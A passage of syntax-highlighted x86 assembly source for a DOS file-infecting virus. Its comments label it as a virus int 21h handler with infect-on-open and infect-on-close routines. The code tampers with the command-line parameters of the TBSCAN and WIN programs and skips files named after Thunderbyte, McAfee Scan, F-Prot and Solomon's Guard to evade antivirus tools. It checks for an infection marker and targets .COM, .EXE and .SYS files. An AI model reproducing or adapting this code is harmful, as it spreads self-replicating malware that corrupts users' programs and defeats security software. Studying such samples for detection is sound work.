                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win_param_string</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">found_end_string</span><span class="sc0">
</span><span class="sc5">no_win_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if file to execute is tbscan.exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">07h</span><span class="sc4">],</span><span class="sc3">"NA"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_add_param</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">09h</span><span class="sc4">],</span><span class="sc3">"CS"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_add_param</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc3">"BT"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_add_param</span><span class="sc0">

                </span><span class="sc1">;Add parameters to tbscan.exe</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_end_string</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_add_param</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0006h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbscan_param_string</span><span class="sc0">

</span><span class="sc5">found_end_string</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Add to number of characters</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc1">;Number of characters + carriage ret</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc1">;Point over carriage ret of original command parameter string</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Get offset of our param string</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Write it over original command parameter string</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">exit_add_param</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Return to virus int 21h handler</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Find end of command parameter string                                      ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">find_end_string</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get address of command parameter string</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc1">;Check if no parameters</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_zero_param</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">no_zero_param</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Find end of command parameter string</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">007Fh</span><span class="sc0">

</span><span class="sc5">search_carriage_ret</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">try_next_char</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">try_next_char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">search_carriage_ret</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect file ( ds:dx ptr to filename )                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">infect_file_ds_dx</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Open file for read-only</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_file_open</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc5">ok_file_open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">from_open</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect file on close                                                      ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get function parameters</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Duplicate handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Close new handle in order to update directory entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">from_open</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if file infection is disabled</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_infection_flag</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Get sft address in es:di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Check device info word</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check if character device handle</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Check if remote file handle</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Check if file is already infected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Check file name in sft</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">name_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get a pair of characters</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not infect files with digit in their file name</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_digit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"9"</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc5">no_digit</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Do not infect files with "V" character in their filename</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"V"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect files with "MO" into their filenames</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"OM"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect files with "IO" into their filenames</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"OI"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect files with "DO" into their filenames</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"OD"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect files with "IB" into their filenames</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"BI"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Next character</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">name_loop</span><span class="sc0">

                </span><span class="sc1">;Get first pair</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not infect Thunderbyte antivirus utils</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"BT"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect McAfee's Scan</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"CS"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect F-Prot scanner</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"-F"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">

                </span><span class="sc1">;Do not infect Solomon's Guard</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"UG"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">file_infection</span><span class="sc0">
</span><span class="sc5">file_error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">critical_exit</span><span class="sc0">
</span><span class="sc5">file_infection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save and set file open mode (read/write)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Save and set file attribute</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">system_file</span><span class="sc0">

                </span><span class="sc1">;Save and set file pointer position</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Read file header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

                </span><span class="sc1">;Seek to end of file and get file size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">

                </span><span class="sc1">;Do not infect too small files</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ok_min_size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc5">ok_min_size</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Point si to file_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
</span><span class="sc5">check_sys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check for .sys extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc3">"YS"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc3">"S"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">inf_sys</span><span class="sc0">
</span><span class="sc5">check_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check for .exe mark in file header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Add markers M+Z</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc3">"Z"</span><span class="sc4">+</span><span class="sc3">"M"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_com</span><span class="sc0">

                </span><span class="sc1">;Check for .exe extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc3">"XE"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_com</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_com</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">inf_exe</span><span class="sc0">
</span><span class="sc5">check_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Avoid infecting .exe type here</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc3">"Z"</span><span class="sc4">+</span><span class="sc3">"M"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

                </span><span class="sc1">;Check for .com extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc3">"OC"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">inf_com</span><span class="sc0">
</span><span class="sc5">exit_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore file pointer position</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">system_file</span><span class="sc4">:</span><span class="sc0">          
                </span><span class="sc1">;Restore file attribute </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Restore file open mode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not set file date/time on closing</span><span class="sc0">
